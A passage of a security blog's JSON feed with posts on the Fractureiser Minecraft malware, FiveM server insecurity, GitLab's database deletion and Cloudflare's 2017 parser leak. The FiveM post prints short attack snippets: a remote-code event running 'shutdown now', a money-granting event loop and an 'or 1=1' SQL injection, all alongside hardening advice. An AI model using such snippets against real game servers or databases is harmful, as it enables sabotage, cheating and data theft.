sets itself up for continued access by creating a new service in the system. It creates a new file in the \"/bin\" directory and a new service in the \"/etc/systemd/system\" directory. The service is configured to restart always, ensuring that the malware remains active even if the system is rebooted or the process is killed. The service runs with the same privileges as the user, allowing it to perform actions on behalf of the user.</p>\n<h2>The Aftermath</h2>\n<p>The aftermath of the Fractureiser malware outbreak was intense activity within the Minecraft community. The hosting company, MCHost.no, took immediate steps to block the domain associated with the malware, thereby reducing its potential harm<sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>. The customer whose server was initially infected had to reinstall all plugins and server.jar, but after these steps, the server was no longer connecting to the malicious server <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-2\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>.</p>\n<p>The community also rallied to provide support and solutions. A detection tool was developed and made available to help users identify if their computer had been infected <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>. The tool checks if the user's system is infected and lists the detected files <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-2\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>. If an infection is found, the user is advised to delete the infected files and run independent malware scanning tools <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-3\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>.</p>\n<p>In addition to the detection tool, a scanning tool was also developed to detect any dormant or other infected mods/Jar files <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-4\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>. This tool scans for stage 0 vulnerability and can detect any infected Jars <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-5\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>.</p>\n<h2>Lessons Learned</h2>\n<p>The Fractureiser malware outbreak has served as a stark reminder of the potential threats that exist in the world of online gaming. It has highlighted the importance of downloading mods and plugins from trusted sources to avoid such issues in the future. The swift response of the Minecraft community in developing detection and scanning tools to combat the malware is commendable. It serves as an example of the power of community collaboration in the face of adversity.</p>\n<p>The incident has also underscored the importance of vigilance and proactive measures in maintaining the security of online gaming environments. As the Fractureiser malware has shown, even seemingly harmless activities like downloading a Minecraft mod can have severe consequences without caution.</p>\n<h2>References</h2>\n<section class=\"footnotes\" data-footnotes=\"true\">\n<ol>\n<li id=\"user-content-fn-1%5E\">\n<p><a href=\"https://ljskatt.no/analysis/updater_class/\" target=\"_new\">Lars Jørgen Skattebo - Updater.class</a></p>\n</li>\n<li id=\"user-content-fn-4%5E\">\n<p><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" target=\"_new\">CurseForge Support - June 2023 - Infected mods detection tool</a></p>\n</li>\n</ol>\n</section>",
            "image": "https://blog.thefourcraft.com/media/posts/53/The-Devastating-Fractureiser-Minecrafts-Malware-Outbreak.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "Minecraft",
                   "Malware",
                   "Fractureiser"
            ],
            "date_published": "2023-06-25T19:17:42+03:00",
            "date_modified": "2023-06-28T18:12:19+03:00"
        },
        {
            "id": "https://blog.thefourcraft.com/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms/index.html",
            "url": "https://blog.thefourcraft.com/kubernetes-privilege-escalation-excessive-permissions-in-popular-platforms/index.html",
            "title": "Why FiveM Servers Are So Insecure",
            "summary": "<p>A deep dive into FiveM server security, This post aims to shed light on why these servers are insecure and how cheaters can exploit these insecurities.</p>\n",
            "content_html": "<p>A deep dive into FiveM server security, This post aims to shed light on why these servers are insecure and how cheaters can exploit these insecurities.</p>\n\n<h2>Introduction</h2>\n<p>FiveM is a modification framework for Grand Theft Auto V, enabling you to play multiplayer on customized dedicated servers. Despite its popularity and extensive features, FiveM servers are often criticized for their security vulnerabilities.</p>\n<h2>Understanding the Threat Landscape</h2>\n<p>Before we can effectively secure our servers, we must first understand what we're up against. Hackers and cheaters are constantly finding new ways to exploit server vulnerabilities, and their methods are often as sophisticated as diverse.</p>\n<h2>Understanding Resources and Streaming</h2>\n<p>In a FiveM server, resources are the addons that allow you to customize your server. These resources can be scripts, maps, vehicles, etc. They are streamed to the player when they connect to the server and during their gameplay. This streaming process allows for a dynamic and immersive gaming experience. However, it also opens up potential security vulnerabilities.</p>\n<h1>Insecure Resources</h1>\n<h2>What is an Insecure Resource?</h2>\n<p>To understand the concept of an insecure resource, we must delve into the possibilities a resource provides to a cheater. In an ideal scenario, a resource should validate the input it receives from clients multiple times. However, in reality, many resources accept input without a second thought, sometimes even allowing the execution of arbitrary code on your server.</p>\n<p>You might think, isn't executing code harmless? What harm could come from it? Well, let's consider an example. Here's a quick and easy way to stop a Linux-Based Server (the entire server, not just the FiveM Server!) if the FXServer is run with administrative privileges:</p>\n<pre><code>TriggerServerEvent(\"RunCode:RunRemotelly\", \"os.execute('shutdown now')\")</code></pre>\n<p>Yes, it's that simple. But remote code execution isn't the only thing a cheater can do. What if a cheater wants to do something seemingly harmless, like giving themselves money? Here's an example:</p>\n<pre><code>for i=1, 100 do</code><br><code>    TriggerServerEvent(\"esx_carsshop:sv:1\", 5000, \"cheated\", \"cheated\")</code><br><code>end</code></pre>\n<div class=\"bg-black rounded-md mb-4\">\n<h1>SQL Injections</h1>\n<h2>SQL Injection in FiveM Servers</h2>\n<p>In my blog, I have talked about <a href=\"https://blog.thefourcraft.com/securing-your-fivem-server-from-sql-vulnerabilities/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">How to prevent SQL injections in your FiveM server </a><br>In the context of FiveM servers, SQL injection can be particularly damaging, which is why developers and server owners must pay close attention to prevent <a href=\"https://blog.thefourcraft.com/securing-your-fivem-server-from-sql-vulnerabilities/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">SQL injections</a></p>\n<h2>Understanding SQL Injection</h2>\n<p>SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access information not intended to be displayed. This information may include sensitive company data, user lists, or private customer details. The impact SQL injection can have on a business is far-reaching. <br>A successful attack may result in unauthorized viewing of user lists, deletion of entire tables, and the attacker gaining administrative rights to a database in certain cases. All of these outcomes are highly detrimental to a business.</p>\n<p>SQL injections typically fall under three categories: In-band SQLi (Classic), Inferential SQLi (Blind), and Out-of-band SQLi.</p>\n<ul>\n<li>\n<p><strong>In-band SQLi: </strong>The attacker uses the same communication channel to launch their attacks and gather their results. It's one of the most common types of SQLi attack due to its simplicity and efficiency.</p>\n</li>\n<li>\n<p><strong>Inferential (Blind) SQLi:</strong> The attacker sends data payloads to the server and observes the response and behavior of the server to learn more about its structure. This method is called blind SQLi because the data is not transferred from the website database to the attacker, thus the attacker cannot see information about the attack in-band.</p>\n</li>\n<li>\n<p><strong>Out-of-band SQLi:</strong> The attacker can only carry out this form of attack when certain features are enabled on the database server used by the web application. This attack is primarily used as an alternative to the in-band and inferential SQLi techniques.</p>\n</li>\n</ul>\nSQL injection can be used to manipulate a standard SQL query to exploit non-validated input vulnerabilities in a database.</div>\n<div class=\"bg-black rounded-md mb-4\">For example, an attacker could alter a typical website’s SQL database query to read <code>http://www.website.com/items/items.asp?itemid=999 or 1=1</code>. As a result, the corresponding SQL query would look like this:</div>\n<pre><code>SELECT ItemName, ItemDescription</code><br><code>FROM Items</code><br><code>WHERE ItemNumber = 999 OR 1=1</code></pre>\n<div>\n<p>And since the statement 1 = 1 is always true, the query returns all of the product names and descriptions in the database, even those that you may not be eligible to access.</p>\n<h1>The RCON Exploit</h1>\n<h2>Understanding the RCON Exploit</h2>\n<p>The RCON exploit revolves around the misuse of the RCON password, a password used to provide remote console access to a server. If this password is known or easily guessable, it can be used to gain unauthorized access to the server. This is particularly concerning if the server is running on an account with administrative privileges, as it allows for the execution of arbitrary commands on the server.</p>\n<p>The exploit works by first gaining access to the RCON of the server. Once access is gained, the attacker can use the 'runcode' resource, a base FiveM resource found on almost every FiveM server, to execute code on the server, on a specific client, or all clients at once.</p>\n<p>The attacker can then use the 'os.execute()' function to run commands on the server's command line, create temporary files to store the output of these commands, and then read these files to gain information about the server. This can be used to find out the current user account running the server, change the password of this account, or even create a new user account with administrative privileges.</p>\n<h2>The Potential Damage</h2>\n<p>The potential damage from this exploit is significant. An attacker could take over the entire machine, infect resources with malicious code, install keyloggers or trojans to log sensitive information, or even use the machine as part of a Distributed Denial of Service (DDoS) attack.</p>\n<p><span style=\"color: var(--headings-color); font-family: var(--font-base); font-size: 1.60181em; font-weight: var(--font-weight-bold); letter-spacing: var(--letter-spacing);\">How to Build A Secure FiveM Server</span></p>\n</div>\n<div class=\"bg-black rounded-md mb-4\">\n<p>Securing your resources is challenging, especially if you are unfamiliar with coding. <br>It is strongly recommended to get someone who is capable of coding on board and then auditing your resources. There is no \"one-check-finds-all\" solution. Every resource requires its way of securing it against cheaters and hackers. However, simply not accepting random input, as many resources do, ensures your server is free of cheaters.</p>\n<p>A good example of correctly using the inbuilt FiveM permission system is vMenu and EasyAdmin. These resources double-check each event with the ACE Natives, ensuring that no one can do things they shouldn't be able to do.</p>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>On another note, employing <a href=\"https://www.vaultproject.io/\" target=\"_blank\" rel=\"noopener noreferrer\">Vault by HashiCorp</a> to rotate secrets, such as the RECON password, is highly advisable. Regularly changing your RCON password is strongly recommended, and ensuring it is not easily guessable is essential. Disabling RCON altogether is also recommended as an additional security measure if feasible.</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p>In addition to these measures, it's important to regularly audit your resources and ensure they are not accepting random input. This goes a long way in ensuring your server is free of cheaters and hackers.</p>\n<p>While FiveM servers offer a unique and customizable gaming experience but are not without security vulnerabilities. Server owners must understand these vulnerabilities and take the necessary steps to secure their servers.</p>\n<h2>So Why FiveM Servers Are So Insecure</h2>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">The primary concern lies with server owners who neglect proper security measures. Securing a FiveM server necessitates a proactive approach. <br>By comprehending potential vulnerabilities and implementing suitable security measures, server owners can safeguard their servers and establish a secure and equitable gaming environment for their players. Always remember, in cybersecurity, a potent offense is the best defense.</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://blog.thefourcraft.com/media/posts/52/Why-FiveM-Servers-Are-So-Insecure.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "Vulnerability",
                   "Security",
                   "My Personal Opinion",
                   "Gaming",
                   "FiveM"
            ],
            "date_published": "2023-06-23T00:03:07+03:00",
            "date_modified": "2023-06-24T15:32:24+03:00"
        },
        {
            "id": "https://blog.thefourcraft.com/dev-deletes-entire-production-database-chaos-ensues/index.html",
            "url": "https://blog.thefourcraft.com/dev-deletes-entire-production-database-chaos-ensues/index.html",
            "title": "Dev Deletes Entire Production Database",
            "summary": "On a seemingly ordinary day at GitLab HQ, a disaster was about to unfold. GitLab, an open-source code sharing platform,&hellip;",
            "content_html": "<p>On a seemingly ordinary day at GitLab HQ, a disaster was about to unfold. GitLab, an open-source code sharing platform, operates fully remotely, and on this day, one of their team members was about to sign off for the day, unaware of the catastrophe that lay ahead.</p>\n<h2>The Beginning of the Crisis</h2>\n<p>At 6 PM UTC, the team member was paged in due to high database load. Upon investigation, he noticed a dramatic increase in the total number of snippets, leading him to assume that the root cause was spam. This was a fair assumption as GitLab had been experiencing similar spam issues in the past week, albeit less severe. Over the next few hours, the team attempted to block certain spam IPs and delete spam users.</p>\n<p>By 9 pm, they were alerted to an elevated number of locks in the database. Whenever write transactions are made to a record, it enforces a lock, forcing further writes to the record to wait for the first one to finish. This ensures that the writes do not interfere with each other. More spam meant more writes, more locks, and more latency. The engineers continued to search for other sources of spam.</p>\n<h2>The Alarm Bells Ring</h2>\n<p>Suddenly, a different alarm went off, this time for database replication lag. GitLab had two databases: a primary one and a secondary replica. Users would write to the primary database, which would then forward the same write to the secondary. The process of forwarding the identical writes to the secondary database is called replication, and over 4 gigabytes of data in the primary database failed to replicate in the secondary. This was a novel issue without proper documentation, so the team member stayed online to support the team.</p>\n<h2>The Failed Attempt to Restore</h2>\n<p>The team decided to use the PostgreSQL command <code>pg_basebackup</code> to create a backup from the live database. The plan was to remove the existing incomplete data on the secondary database and run <code>pg_basebackup</code> to copy the current primary database data to the secondary and then restart replication from there. However, the command failed, complaining that the primary database did not have enough replication clients.</p>\n<p>In response, the team member SSH-ed onto the primary database and increased this value in the config. Upon attempting to reload Postgres, it complained that there were too many open connections, which happens when max connections is set too high. He lowered this value, and this time the settings applied without issue.</p>\n<p>However, when he ran <code>pg_basebackup</code> again, it appeared to just hang and do nothing. Frustration began to kick in. The engineers thought perhaps the prior attempts to run <code>pg_basebackup</code> before the configuration changes had created some buggy files in the data directory, interfering with the current run. The fix would be to remove these files and try again.</p>\n<h2>The Catastrophic Mistake</h2>\n<p>\"Well might as well give it a shot,\" thought the team member, \"a hard reset to start on a clean slate, so to say.\" He prepared the command to <code>rm -rf</code> the directory and ran it in his shell session. Immediately after pressing enter, he noticed the shell in which he ran the command was the one connected to the live production primary database. He tried to stop the command, but it was too late. Of the over 300 gigabytes of data, only 4.5 was left. The secondary database had previously been wiped of data before running the backup command. GitLab now officially had zero data in any of their production database servers.</p>\n<h2>The Recovery Process</h2>\n<p>The team scrambled to find a copy of the production data. They checked for the database backups that were supposed to be uploaded to S3 but found nothing there. They also checked for disk snapshots, butthey found they didn't actually take these snapshots for their database servers as they assumed the other backup procedures were sufficient. Lastly, they checked for logical volume snapshots or backups of the file system.</p>\n<p>GitLab had a staging database for testing which periodically captured snapshots from the primary database to remain up to date with production. These snapshots were normally captured once every 24 hours, but luckily, the team member had taken a snapshot six hours before the outage.</p>\n<p>Now there were two choices: they could copy either the entire LVM snapshot or just the Postgres data directory from staging to production. The amount of data was similar in both options, but they opted to copy the data directory as that would be easier to restore from.</p>\n<p>However, their staging environment used Azure Classic in a different region, without premium storage, which they could not retroactively upgrade. Therefore, data transfer rates were limited to around 60 megabits per second. Copying the data to production took a solid 18 hours and nearly 24 hours later, GitLab was back up to normal operation.</p>\n<p>The only caveat was that all database data such as projects, issues, and snippets created in the six hours between the LVM snapshot and the outage were permanently lost. This affected around 5000 projects, 5000 comments, and 700 users.</p>\n<h2>Lessons Learned</h2>\n<p>Post incident, it was discovered that the replication lag was actually caused by a background job trying to delete a GitLab employee's account due to it being reported for abuse by a troll in combination with the other spam.</p>\n<p>The team also discovered that the database backups weren't uploaded to S3 because the server which was taking the database backups was using the wrong version of Postgres. These failures should have sent warning emails but they never received any of them because they forgot to enable DMARC authentication on the backup server.</p>\n<p>The incident highlighted the importance of having a second pair of eyes to review commands before running them, especially in a production environment. It also emphasized the need for thorough load testing and regular testing of backup procedures.</p>\n<p>In the end, the team member was not fired. There were many factors which led to that <code>rm -rf</code> moment and many more factors which led to it taking 18 hours to recover from there, none of which were a single person's fault. GitLab's CEO personally apologized for the outage, and GitLab never accidentally deleted their production database ever again.</p>\n<p>This incident serves as a stark reminder of the importance of robust backup procedures, careful command execution, and thorough testing in maintaining the integrity of production databases.</p>",
            "image": "https://blog.thefourcraft.com/media/posts/51/Dev-Deletes-Entire-Production-Database.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "GitLab"
            ],
            "date_published": "2023-06-16T14:37:08+03:00",
            "date_modified": "2023-06-24T16:30:04+03:00"
        },
        {
            "id": "https://blog.thefourcraft.com/terraform-a-game-changer-for-code-deployment/index.html",
            "url": "https://blog.thefourcraft.com/terraform-a-game-changer-for-code-deployment/index.html",
            "title": "Terraform: A Game-Changer",
            "summary": "<p>Terraform, a tool developed by HashiCorp, has revolutionized how developers deploy code. This open-source infrastructure as code (IaC) software tool enables developers to define and provide data center infrastructure using a declarative configuration language. </p>\n",
            "content_html": "<p>Terraform, a tool developed by HashiCorp, has revolutionized how developers deploy code. This open-source infrastructure as code (IaC) software tool enables developers to define and provide data center infrastructure using a declarative configuration language. </p>\n\n<h2>What is Infrastructure as Code (IaC)?</h2>\n<p>Infrastructure as Code (IaC) manages and provides computing infrastructure with machine-readable definition files rather than hardware configuration or interactive configuration tools. It's a way to automate your infrastructure to make it quicker, more efficient, and less error-prone.</p>\n<p>The concept of IaC revolves around the idea of declarative programming. Instead of writing code to perform iterative or procedural actions based on the current state of your environment, you describe what the expected state of your environment should look like, and Terraform will perform the necessary changes to achieve it. This approach keeps the definition of your system concise and understandable, even as the infrastructure becomes more complex.</p>\n<h2>Why Use Terraform?</h2>\n<p>Terraform is not the only tool that can do infrastructure as code, but it's probably the most ubiquitous. It allows you to build, change, and version Cloud resources safely and efficiently. Here are some of the key benefits of using Terraform:</p>\n<ol>\n<li>\n<p><strong>Deterministic and Repeatable Method for Managing Infrastructure</strong>: With Terraform, tearing down an entire environment and rebuilding it is possible in just two steps. This makes managing your infrastructure more predictable.</p>\n</li>\n<li>\n<p><strong>Version Control</strong>: By checking your code into a Version Control System such as Git, you get all its benefits, such as having your IaC reviewed by other developers and having a log of changes made to your environment.</p>\n</li>\n<li>\n<p><strong>Automation</strong>: Terraform allows you to automate the deployment process. For example, rather than manually deploying any changes you make to your Lambda function each time you make them, you can set up a continuous deployment pipeline to apply your changes whenever you commit to your main branch.</p>\n</li>\n</ol>\n<h2>Deploying Infrastructure with Terraform</h2>\n<p>To illustrate Terraform's work, consider a simple scenario: deploying an app with an AWS Lambda function, an SQS queue, and an S3 bucket. Here's how you can use Terraform to deploy this infrastructure:</p>\n<ol>\n<li>\n<p><strong>Install Terraform</strong>: The first step is to install Terraform on your system. You can use a tool like then, which allows you to manage different versions of Terraform.</p>\n</li>\n<li>\n<p><strong>Define Your Infrastructure</strong>: In Terraform, you define your infrastructure in .tf files using the HashiCorp Configuration Language (HCL). For example, you can specify an S3 bucket resource in a file called main.tf.</p>\n</li>\n<li>\n<p><strong>Initialize Terraform</strong>: Once you've defined your infrastructure, you can initialize Terraform in your project directory using the <code>Terraform init</code> command. This command downloads the necessary provider plugins.</p>\n</li>\n<li>\n<p><strong>Plan and Apply Changes</strong>: With Terraform, you can see the changes that will be made to your infrastructure before they are applied. You can do this using the <code>terraform plan</code> command. You can apply the changes using the Terraform apply base if everything looks good.</p>\n</li>\n<li>\n<p><strong>Destroy Resources</strong>: If you want to tear down the resources you've created, you can use the <code>terraform destroy</code> command.</p>\n</li>\n</ol>\n<h2>Conclusion</h2>\n<p>Terraform has forever changed the way developers deploy code. It brings a level of automation and predictability to infrastructure management that was previously difficult to achieve. By treating infrastructure as code, Terraform allows developers to take full advantage of version control systems and continuous integration/continuous deployment (CI/CD) pipelines, leading to more reliable and efficient infrastructure deployments.</p>\n<p>However, as with any tool, using Terraform responsibly is essential. Always review the changes that Terraform plans to make before applying them, and be mindful of the resources you create to avoid unnecessary costs. And remember, while Terraform can make your life much easier, it's not a silver bullet. It's a powerful tool in a developer's toolkit but must be used with good practices and careful planning.</p>\n<p>Ultimately, using a tool like Terraform makes your infrastructure more manageable, reliable, and efficient. Treating your infrastructure as code can bring all the benefits of modern software development practices to the infrastructure management world. And that's a game-changer.</p>",
            "image": "https://blog.thefourcraft.com/media/posts/50/Terraform-A-Game-Changer.png",
            "author": {
                "name": "thefourCraft"
            },
            "tags": [
                   "Terraform",
                   "HashiCorp",
                   "DevOps"
            ],
            "date_published": "2023-06-16T14:36:08+03:00",
            "date_modified": "2023-06-24T16:24:09+03:00"
        },
        {
            "id": "https://blog.thefourcraft.com/how-one-line-of-code-almost-blew-up-the-internet/index.html",
            "url": "https://blog.thefourcraft.com/how-one-line-of-code-almost-blew-up-the-internet/index.html",
            "title": "How One Line of Code Almost Blew Up the Internet",
            "summary": "<p>The digital realm is intricately woven into the fabric of our modern society, and at its core lies an intricate network of codes. Each line of this code bears the potential to either sustain the digital world as we know it or disrupt it entirely. Let's delve into a fascinating incident that nearly shook the internet's foundation – a tale of how a single line of code in <a class=\"ql-mention\" href=\"https://www.linkedin.com/post/edit/7075015664599457792/#\" data-entity-urn=\"urn:li:fsd_company:407222\" data-guid=\"2\" data-object-urn=\"urn:li:organization:407222\" data-original-text=\"Cloudflare\" spellcheck=\"false\">Cloudflare</a>'s system almost led to a catastrophic leakage of private information. This incident is a stark reminder of the fragility of the digital infrastructure we often take for granted and the critical importance of rigorous testing and code review processes. Buckle up for a deep dive into the incident that almost blew up the internet on February 24, 2017.</p>\n",
            "content_html": "<p>The digital realm is intricately woven into the fabric of our modern society, and at its core lies an intricate network of codes. Each line of this code bears the potential to either sustain the digital world as we know it or disrupt it entirely. Let's delve into a fascinating incident that nearly shook the internet's foundation – a tale of how a single line of code in <a class=\"ql-mention\" href=\"https://www.linkedin.com/post/edit/7075015664599457792/#\" data-entity-urn=\"urn:li:fsd_company:407222\" data-guid=\"2\" data-object-urn=\"urn:li:organization:407222\" data-original-text=\"Cloudflare\" spellcheck=\"false\">Cloudflare</a>'s system almost led to a catastrophic leakage of private information. This incident is a stark reminder of the fragility of the digital infrastructure we often take for granted and the critical importance of rigorous testing and code review processes. Buckle up for a deep dive into the incident that almost blew up the internet on February 24, 2017.</p>\n\n<h2>The Bug That Shook The Internet</h2>\n<p>On February 24, 2017, the internet faced a potential catastrophe. An incident involving <a class=\"ql-mention\" href=\"https://www.linkedin.com/post/edit/7075015664599457792/#\" data-entity-urn=\"urn:li:fsd_company:407222\" data-guid=\"3\" data-object-urn=\"urn:li:organization:407222\" data-original-text=\"Cloudflare\" spellcheck=\"false\">Cloudflare</a>, a company that provides performance and security services to millions of websites, threatened to spill private data across the web. The issue was a memory leak caused by a <a class=\"ql-mention\" href=\"https://www.linkedin.com/post/edit/7075015664599457792/#\" data-entity-urn=\"urn:li:fsd_company:407222\" data-guid=\"5\" data-object-urn=\"urn:li:organization:407222\" data-original-text=\"Cloudflare\" spellcheck=\"false\">Cloudflare</a>'s HTML parser bug. Tavis Ormandy first reported the bug from Google’s Project Zero, who noticed corrupted web pages returned by some HTTP requests run through Cloudflare.</p>\n<p><a class=\"ql-mention\" href=\"https://www.linkedin.com/post/edit/7075015664599457792/#\" data-entity-urn=\"urn:li:fsd_company:407222\" data-guid=\"4\" data-object-urn=\"urn:li:organization:407222\" data-original-text=\"Cloudflare\" spellcheck=\"false\">Cloudflare</a>'s edge servers, under certain unusual circumstances, were returning memory containing private data like HTTP cookies, authentication tokens, and HTTP POST bodies. Some of this data had even been cached by search engines, increasing the potential damage. While this sounds alarming, it's worth noting that Cloudflare customer SSL private keys were not leaked due to the isolation of SSL connections through an instance of NGINX unaffected by this bug.</p>\n<h2>Taking Immediate Action</h2>\n<p>The seriousness of the bug led to the immediate formation of a cross-functional team from software engineering, infosec, and operations in San Francisco and London. The team worked round the clock, with 12-hour shifts, to ensure a 24-hour work cycle. They aimed to understand the cause and the extent of the memory leakage and coordinate with <a class=\"ql-mention\" href=\"https://www.linkedin.com/post/edit/7075015664599457792/#\" data-entity-urn=\"urn:li:fsd_company:1441\" data-guid=\"13\" data-object-urn=\"urn:li:organization:1441\" data-original-text=\"Google\" spellcheck=\"false\">Google</a> and other search engines to remove any cached HTTP responses. Thanks to their dedication, what could have taken three months to resolve under industry standards was fully dealt with globally in under 7 hours, with initial mitigation happening in just 47 minutes.</p>\n<p>The most significant impact period was between February 13 and February 18, with around 1 in every 3,300,000 HTTP requests through Cloudflare potentially resulting in memory leakage. This translates to about 0.00003% of requests, but with the sheer volume of traffic Cloudflare handles, the implications were significant.</p>\n<h2>Unraveling The Root Cause</h2>\n<p>The root of the problem lay in Cloudflare's parsing system. Cloudflare uses a parser to modify HTML pages as they pass through their edge servers. It offers various services like inserting the Google Analytics tag, rewriting http:// links to https://, and more. This parser was written using Ragel, a state machine compiler, which had become too complex to maintain over the years. Consequently, Cloudflare began transitioning to a new parser named cf-html, which was faster and easier to maintain.</p>\n<p>The memory leak bug had been in the Ragel-based parser for years but was only triggered when the new parser cf-html was introduced. This caused changes in the buffering system, enabling the memory leak. As soon as the correlation with cf-html was identified, Cloudflare disabled three features that used it - email obfuscation, Server-side Excludes, and Automatic HTTPS Rewrites, effectively stopping almost all memory leaks within a few seconds. A third feature, Server-Side Excludes, was also vulnerable and quickly patched within three hours.</p>\n<h2>The Infamous One Line of Code</h2>\n<p>The root cause of the bug was a pointer error in the generated C code from Ragel. <br>The end of a buffer was checked using the equality operator, allowing the pointer to step past the end of the buffer, resulting in a buffer overrun. Had the check been done using the '&gt;=' operator instead of '==', the buffer overrun would have been caught.</p>\n<p>The Ragel code contained a bug that caused the pointer to jump over the end of the buffer and past the ability of an equality check to spot the buffer overrun. This error was triggered particularly when parsing broken HTML tags at the end of a web page. An example of such a tag is <code>&lt;script type=</code>. In such cases, the buffer would be overrun. Statistically, such broken tags occur on about 0.06% of websites.</p>\n<h2>Incident Timeline</h2>\n<ul>\n<li>\n<p>At an unspecified date, Cloudflare decided that their Ragel-based parser had become too complex to maintain, so they started to write a new parser, named cf-html, to replace it. This parser was used to modify HTML pages on the fly as they passed through Cloudflare's edge servers, for functions such as obfuscating email addresses, enabling AMP, inserting Google Analytics tags, and more.</p>\n</li>\n<li>\n<p>A bug existed in Cloudflare's use of the Ragel-based parser that would result in a memory leak. However, this bug was not exposed until the introduction of cf-html, which subtly changed the buffering and enabled the leakage. The bug was not in the Ragel parser or cf-html itself, but in the way Cloudflare used Ragel.</p>\n</li>\n<li>\n<p>On February 13, Cloudflare changed the Email Obfuscation feature, which was one of the features that activated cf-html. This became the primary cause of the memory leak.</p>\n</li>\n<li>\n<p>Between February 13 and February 18, approximately 1 in every 3,300,000 HTTP requests through Cloudflare potentially resulted in memory leakage, which is about 0.00003% of requests.</p>\n</li>\n<li>\n<p>On an unspecified Friday, Tavis Ormandy from Google’s Project Zero contacted Cloudflare to report a security problem with Cloudflare's edge servers. He was observing corrupted web pages being returned by some HTTP requests run through Cloudflare. The edge servers were running past the end of a buffer and returning memory that contained private information such as HTTP cookies, authentication tokens, HTTP POST bodies, and other sensitive data.</p>\n</li>\n<li>\n<p>Cloudflare responded by forming a cross-functional team from software engineering, infosec, and operations in San Francisco and London. They worked to fully understand the underlying cause, understand the effect of the memory leakage, and to work with Google and other search engines to remove any cached HTTP responses.</p>\n</li>\n<li>\n<p>47 minutes after receiving details of the problem, Cloudflare activated the global kill for the Email Obfuscation feature, stopping almost all memory leaks. 3 hours and 5 minutes later, they activated the global kill for the Automatic HTTPS Rewrites feature. They confirmed that they were not seeing memory leakage via test URIs and had Google double check that they saw the same thing.</p>\n</li>\n<li>\n<p>Cloudflare discovered that a third feature, Server-Side Excludes, was also vulnerable. Since it was an older feature, it did not have a global kill switch. They implemented a global kill for Server-Side Excludes and deployed a patch to their fleet worldwide, which took roughly three hours.</p>\n</li>\n<li>\n<p>The root cause of the bug was a pointer error. The Ragel code that Cloudflare wrote contained a bug that caused the pointer to jump over the end of the buffer and past the ability of an equality check to spot the buffer overrun. This error was found to occur when the webpage ended with a broken HTML tag. From their statistics, they found that such broken tags at the end of the HTML occur on about 0.06% of websites.</p>\n</li>\n<li>\n<p>Cloudflare stated that they fixed the bug and its consequences globally in under 7 hours with an initial mitigation in 47 minutes. They also emphasized that Cloudflare customer SSL private keys were not leaked and that they have not discovered any evidence of malicious exploits of the bug or other reports of its existence.</p>\n</li>\n</ul>\n<h2>A Close Call and Lessons Learned</h2>\n<p>This incident was a close call for the internet. With a significant number of websites relying on Cloudflare's services, the potential leak of private data could have had far-reaching consequences. However, the swift action taken by Cloudflare's team, their transparency about the problem, and the steps taken to mitigate the issue serve as an excellent example of handling security crises.</p>\n<p>Moreover, the incident underscores the importance of rigorous testing and code review processes, especially when dealing with critical systems handling sensitive data. Even a seemingly innocuous code change can have unforeseen and widespread effects, reminding us all of the profound responsibility and potential impact of a single line of code.</p>\n<h2>Sources</h2>\n<ul>\n<li>\n<p><a href=\"https://techcrunch.com/2023/03/10/cloudflare-outage/\" target=\"_new\">Cloudflare outage takes down a large portion of the internet</a></p>\n</li>\n<li><a 